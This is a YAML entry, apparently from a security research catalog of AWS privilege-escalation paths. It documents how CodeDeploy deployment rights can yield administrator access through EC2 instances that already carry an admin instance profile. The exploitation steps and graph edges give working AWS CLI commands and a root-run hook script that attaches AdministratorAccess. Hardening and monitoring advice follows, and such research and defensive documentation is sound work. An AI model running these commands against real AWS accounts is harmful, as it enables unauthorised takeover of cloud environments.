@@ -1,0 +1,269 @@
+id: codedeploy-001
+name: codedeploy:CreateDeployment
+category: existing-passrole
+services:
+  - iam
+  - codedeploy
+  - ec2
+
+permissions:
+  required:
+    - permission: codedeploy:CreateDeployment
+      resourceConstraints: Must have access to the target CodeDeploy application and deployment group
+    - permission: codedeploy:RegisterApplicationRevision
+      resourceConstraints: Must be able to register a new revision in the target S3 bucket
+    - permission: codedeploy:GetDeploymentConfig
+      resourceConstraints: Required to resolve the deployment configuration when creating a deployment
+  additional:
+    - permission: codedeploy:GetDeployment
+      resourceConstraints: Useful for monitoring deployment status
+    - permission: codedeploy:ListDeployments
+      resourceConstraints: Helpful for discovering existing deployments
+    - permission: codedeploy:GetDeploymentGroup
+      resourceConstraints: Useful for viewing deployment group configuration and target EC2 instances
+    - permission: codedeploy:GetApplication
+      resourceConstraints: Useful for verifying application configuration
+    - permission: codedeploy:ListDeploymentInstances
+      resourceConstraints: Useful for tracking deployment progress across instances
+    - permission: codedeploy:GetDeploymentInstance
+      resourceConstraints: Useful for viewing per-instance deployment status and lifecycle hook output
+
+description: A principal with `codedeploy:CreateDeployment` and `codedeploy:RegisterApplicationRevision` can escalate privileges by deploying a malicious revision to an existing CodeDeploy deployment group that targets EC2 instances already configured with an admin IAM instance profile. The revision's `appspec.yml` contains a `BeforeInstall` lifecycle hook that runs a shell script on the target EC2 instance. Because the instance already has the admin instance profile attached, the script runs with admin credentials and calls `iam:AttachUserPolicy` to attach AdministratorAccess to the starting user. No `iam:PassRole` is required — the privileged instance profile was already assigned to the existing EC2 instance.
+
+prerequisites:
+  admin:
+    - An existing CodeDeploy deployment group must be configured to target EC2 instances
+    - The target EC2 instances must already have an admin IAM instance profile attached
+    - The CodeDeploy agent must be installed and running on the target instances
+    - An S3 bucket must be accessible to stage the malicious deployment revision
+  lateral:
+    - An existing CodeDeploy deployment group must target EC2 instances with an elevated IAM instance profile
+    - The CodeDeploy agent must be running on the target instances
+
+exploitationSteps:
+  awscli:
+    - step: 1
+      command: |
+        mkdir -p /tmp/malicious-revision
+        cat > /tmp/malicious-revision/appspec.yml << 'EOF'
+        version: 0.0
+        os: linux
+        hooks:
+          BeforeInstall:
+            - location: scripts/escalate.sh
+              timeout: 60
+              runas: root
+        EOF
+
+        mkdir -p /tmp/malicious-revision/scripts
+        cat > /tmp/malicious-revision/scripts/escalate.sh << 'EOF'
+        #!/bin/bash
+        aws iam attach-user-policy \
+          --user-name STARTING_USER \
+          --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
+        echo "Privilege escalation complete"
+        EOF
+        chmod +x /tmp/malicious-revision/scripts/escalate.sh
+
+        cd /tmp/malicious-revision
+        zip -r /tmp/revision.zip .
+
+        aws s3 cp /tmp/revision.zip s3://ATTACKER_BUCKET/revision.zip
+      description: Create a malicious deployment revision with an appspec.yml containing a BeforeInstall lifecycle hook that calls iam:AttachUserPolicy. Package and upload to S3.
+    - step: 2
+      command: |
+        aws deploy register-application-revision \
+          --application-name CODEDEPLOY_APP_NAME \
+          --s3-location bucket=ATTACKER_BUCKET,key=revision.zip,bundleType=zip
+      description: Register the malicious revision with the CodeDeploy application so it can be referenced when creating a deployment.
+    - step: 3
+      command: |
+        aws deploy create-deployment \
+          --application-name CODEDEPLOY_APP_NAME \
+          --deployment-group-name DEPLOYMENT_GROUP_NAME \
+          --deployment-config-name CodeDeployDefault.AllAtOnce \
+          --ignore-application-stop-failures \
+          --file-exists-behavior OVERWRITE \
+          --revision 'revisionType=S3,s3Location={bucket=ATTACKER_BUCKET,key=revision.zip,bundleType=zip}'
+      description: Create a deployment using the malicious revision. The CodeDeploy agent on the target EC2 instance runs the BeforeInstall hook script using the instance's admin IAM credentials.
+    - step: 4
+      command: |
+        aws deploy get-deployment \
+          --deployment-id DEPLOYMENT_ID \
+          --query 'deploymentInfo.status' \
+          --output text
+      description: Monitor deployment status. Once the BeforeInstall hook executes, AdministratorAccess is attached to the starting user.
+
+recommendation: |
+  - **Restrict `codedeploy:CreateDeployment`** - This is a powerful permission when privileged EC2 instances exist. Only trusted CI/CD principals should be able to create deployments, and only to specific deployment groups.
+  - **Audit EC2 instance profiles in CodeDeploy deployment groups** - Any EC2 instance with an admin instance profile that is part of a CodeDeploy deployment group is a standing escalation vector for anyone with `codedeploy:CreateDeployment`. Regularly review and down-scope these instance profiles.
+  - **Use IAM resource conditions on `codedeploy:CreateDeployment`** - Restrict which deployment groups a principal can deploy to, and which S3 buckets revision artifacts can come from.
+  - **Enforce revision source restrictions** - Consider using deployment group configuration to restrict revision sources to trusted S3 buckets or ECR repositories only.
+  - Monitor CloudTrail for `codedeploy:CreateDeployment` calls by principals who do not normally trigger deployments
+  - Alert on IAM policy attachment events originating from EC2 instances in CodeDeploy deployment groups
+  - Monitor CloudTrail for deployment revisions sourced from unexpected S3 buckets
+  - Regularly audit CodeDeploy deployment groups for privileged EC2 instance profiles in their target groups
+
+discoveryAttribution:
+  firstDocumented:
+    author: Seth Art
+    organization: Datadog
+    date: "2025"
+
+references:
+  - title: "Actions defined by AWS CodeDeploy - Service Authorization Reference"
+    url: "https://docs.aws.amazon.com/service-authorization/latest/reference/list_awscodedeploy.html"
+  - title: "CodeDeploy permissions reference - AWS CodeDeploy"
+    url: "https://docs.aws.amazon.com/codedeploy/latest/userguide/auth-and-access-control-permissions-reference.html"
+
+learningEnvironments:
+  pathfinding-labs:
+    type: open-source
+    githubLink: https://github.com/DataDog/pathfinding-labs
+    scenario: "privesc-one-hop/to-admin/codedeploy-001-codedeploy-createdeployment"
+    description: "Deploy Terraform scenarios individually or in groups, each with attack and cleanup scripts"
+
+attackVisualization:
+  nodes:
+    - id: start
+      label: Starting Principal
+      type: principal
+      description: The principal with `codedeploy:CreateDeployment`, `codedeploy:RegisterApplicationRevision`, and `codedeploy:GetDeploymentConfig` permissions. No `iam:PassRole` is required — the privileged instance profile was already attached to the existing EC2 instance.
+
+    - id: attacker_s3
+      label: Attacker S3 Bucket (malicious revision)
+      type: resource
+      description: |
+        An S3 bucket accessible to the attacker where the malicious deployment revision is staged. The revision is a zip file containing an `appspec.yml` with a `BeforeInstall` lifecycle hook and a shell script that performs privilege escalation.
+
+        The `appspec.yml` structure:
+        ```yaml
+        version: 0.0
+        os: linux
+        hooks:
+          BeforeInstall:
+            - location: scripts/escalate.sh
+              timeout: 60
+              runas: root
+        ```
+
+        The `escalate.sh` script calls `iam:AttachUserPolicy` using the instance's pre-existing admin credentials from IMDS.
+
+    - id: codedeploy_app
+      label: CodeDeploy Application + Deployment Group
+      type: resource
+      description: |
+        An existing CodeDeploy application and deployment group that targets EC2 instances with an admin instance profile already attached. The attacker registers the malicious revision and creates a deployment against this group.
+
+        The deployment group's EC2 instances are the attack surface — their pre-existing admin instance profile is what makes this an `existing-passrole` path. The attacker never needs to attach a role; they just trigger code execution on an instance that already has one.
+
+    - id: ec2_instance
+      label: Target EC2 Instance (pre-attached admin profile)
+      type: resource
+      description: |
+        An existing EC2 instance that is part of the CodeDeploy deployment group and already has an admin IAM instance profile attached. The CodeDeploy agent running on this instance executes the lifecycle hook scripts from the deployment revision.
+
+        Because the instance profile was attached before this attack, no `iam:PassRole` permission is needed. The attacker simply triggers code execution on an instance that already carries the privileged identity.
+
+    - id: admin_role
+      label: Admin Instance Profile Role
+      type: principal
+      description: |
+        The IAM role backing the admin instance profile that was already attached to the EC2 instance. The role's temporary credentials are available via the instance metadata service (IMDS) at `http://169.254.169.254/latest/meta-data/iam/security-credentials/`.
+
+        The lifecycle hook script accesses these credentials automatically — the AWS CLI on the instance uses them without any explicit configuration because they are provided by the EC2 instance metadata service.
+
+    - id: admin_outcome
+      label: Effective Administrator
+      type: outcome
+      description: The pre-attached instance profile role has AdministratorAccess or equivalent permissions. The lifecycle hook script executes with those credentials and attaches AdministratorAccess to the starting principal.
+
+    - id: some
+      label: Some additional access
+      type: outcome
+      color: '#ffeb99'
+      description: The pre-attached instance profile role has elevated but non-admin permissions. The lifecycle hook script can leverage those credentials for data access, resource modification, or further escalation depending on what the role can do.
+
+    - id: no
+      label: No additional access
+      type: outcome
+      color: '#cccccc'
+      description: The pre-attached instance profile role has only minimal permissions. The lifecycle hook script runs but the available credentials provide little practical value for privilege escalation.
+
+  edges:
+    - from: start
+      to: attacker_s3
+      label: codedeploy:RegisterApplicationRevision
+      description: |
+        Create a malicious deployment revision containing a `BeforeInstall` lifecycle hook script and upload it to an attacker-controlled S3 bucket, then register it with the target CodeDeploy application.
+
+        Package and upload:
+        ```bash
+        cd /tmp/malicious-revision && zip -r /tmp/revision.zip .
+        aws s3 cp /tmp/revision.zip s3://ATTACKER_BUCKET/revision.zip
+        ```
+
+        Register with CodeDeploy:
+        ```bash
+        aws deploy register-application-revision \
+          --application-name CODEDEPLOY_APP_NAME \
+          --s3-location bucket=ATTACKER_BUCKET,key=revision.zip,bundleType=zip
+        ```
+
+    - from: start
+      to: codedeploy_app
+      label: codedeploy:CreateDeployment
+      description: |
+        Create a deployment against the target deployment group using the malicious revision. The CodeDeploy agent on target EC2 instances will pull the revision from S3 and execute the lifecycle hook scripts.
+
+        Command:
+        ```bash
+        aws deploy create-deployment \
+          --application-name CODEDEPLOY_APP_NAME \
+          --deployment-group-name DEPLOYMENT_GROUP_NAME \
+          --deployment-config-name CodeDeployDefault.AllAtOnce \
+          --ignore-application-stop-failures \
+          --file-exists-behavior OVERWRITE \
+          --revision 'revisionType=S3,s3Location={bucket=ATTACKER_BUCKET,key=revision.zip,bundleType=zip}'
+        ```
+
+    - from: codedeploy_app
+      to: ec2_instance
+      label: CodeDeploy agent runs lifecycle hooks
+      description: The CodeDeploy agent on the target EC2 instance pulls the malicious revision from S3 and executes the `BeforeInstall` lifecycle hook script as root. The agent handles the entire execution flow — the attacker only needed to trigger the deployment.
+
+    - from: ec2_instance
+      to: admin_role
+      label: Instance accesses pre-existing admin role via IMDS
+      description: |
+        The lifecycle hook script running on the EC2 instance accesses the pre-attached admin instance profile's temporary credentials via the instance metadata service (IMDS). The AWS CLI on the instance automatically uses these credentials.
+
+        The script calls `iam:AttachUserPolicy` using these credentials:
+        ```bash
+        aws iam attach-user-policy \
+          --user-name STARTING_USER \
+          --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
+        ```
+
+        No explicit credential configuration is needed — the EC2 metadata service provides them automatically to the AWS CLI.
+
+    - from: admin_role
+      to: admin_outcome
+      label: If instance profile role has admin permissions
+      branch: A
+      condition: admin
+      description: If the pre-attached instance profile role has AdministratorAccess or permissions including `iam:AttachUserPolicy`, the lifecycle hook script successfully attaches AdministratorAccess to the starting principal.
+
+    - from: admin_role
+      to: some
+      label: If instance profile role has some elevated permissions
+      branch: B
+      condition: some_permissions
+      description: If the pre-attached instance profile role has elevated but non-admin permissions, the lifecycle hook script can leverage those credentials for data access or further escalation paths.
+
+    - from: admin_role
+      to: no
+      label: If instance profile role has minimal permissions
+      branch: C
+      condition: no_permissions
+      description: If the pre-attached instance profile role has only minimal permissions, the lifecycle hook script runs but provides little practical value for privilege escalation.
